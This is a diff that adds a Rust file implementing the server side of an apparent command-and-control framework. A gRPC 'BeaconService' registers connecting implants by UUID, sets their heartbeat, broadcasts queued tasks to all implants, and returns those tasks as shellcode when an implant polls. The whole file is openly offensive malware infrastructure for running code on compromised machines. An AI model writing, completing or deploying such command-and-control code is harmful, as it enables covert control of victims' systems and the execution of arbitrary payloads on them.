+++ beacon/src/beacon.rs
@@ -1,0 +1,74 @@
+use std::{collections::HashMap, sync::Arc};
+
+use tokio::sync::RwLock;
+use tonic::{Request, Response, Status};
+use uuid::Uuid;
+
+use crate::Task;
+
+use crate::implant::Implant;
+use crate::tasks::{
+    beacon_service_server::BeaconService, ConnectionRequest, ConnectionResponse, PollRequest,
+    PollResponse,
+};
+
+const HEARTBEAT: u32 = 5000; // TODO: variable heartbeat config for implant
+
+#[derive(Debug, Default)]
+pub struct Beacon {
+    implants: RwLock<HashMap<Uuid, Implant>>,
+}
+impl Beacon {
+    pub fn new() -> Arc<Self> {
+        Arc::new(Self::default())
+    }
+
+    pub async fn add_task(&self, task: Task) {
+        let map = self.implants.read().await;
+
+        for (_, val) in map.iter() {
+            val.push_task(task.clone()).await;
+        }
+    }
+}
+
+#[tonic::async_trait]
+impl BeaconService for Arc<Beacon> {
+    async fn connection(
+        &self,
+        _request: Request<ConnectionRequest>,
+    ) -> Result<Response<ConnectionResponse>, Status> {
+        let id = Uuid::new_v4();
+
+        println!("Got a connection request: {id}");
+
+        let mut map = self.implants.write().await;
+        map.insert(id, Implant::default());
+
+        Ok(Response::new(ConnectionResponse {
+            uuid: id.to_string(),
+            heartbeat: HEARTBEAT,
+        }))
+    }
+
+    // type PollStream = Pin<Box<dyn Stream<Item = Result<PollResponse, Status>> + Send + 'static>>;
+
+    async fn poll(&self, request: Request<PollRequest>) -> Result<Response<PollResponse>, Status> {
+        let id = Uuid::parse_str(&request.into_inner().uuid);
+        if id.is_err() {
+            return Err(Status::invalid_argument("Failed to parse uuid."));
+        }
+
+        let map = self.implants.read().await;
+        Ok(Response::new(PollResponse {
+            shellcode: match map.get(&id.unwrap()) {
+                Some(v) => v.pop_task().await,
+                None => {
+                    return Err(Status::not_found(
+                        "Client doesn't exist or isn't connected.",
+                    ))
+                }
+            },
+        }))
+    }
+}
